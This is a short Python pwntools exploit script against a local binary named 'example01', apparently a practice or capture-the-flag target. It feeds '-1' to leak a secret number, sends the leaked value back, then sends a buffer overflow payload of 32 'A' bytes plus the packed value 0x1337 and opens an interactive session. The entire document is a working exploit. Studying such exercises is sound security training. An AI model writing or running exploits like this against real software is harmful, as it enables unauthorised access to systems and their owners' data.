from pwn import *  # NOQA
import re

context.log_level = 'debug'

p = process('./example01')
p.recvuntil(b'> ')
p.sendline(b'-1')  # Leak secret_number
response = p.recvuntil(b'> ')
leak = re.findall(br"(\d+)$", response, flags=re.MULTILINE)[0]
print('leak: {}'.format(leak))

p.sendline(leak)

p.recvuntil(b'> ')
p.sendline(b'A' * 32 + p32(0x1337))

p.interactive()
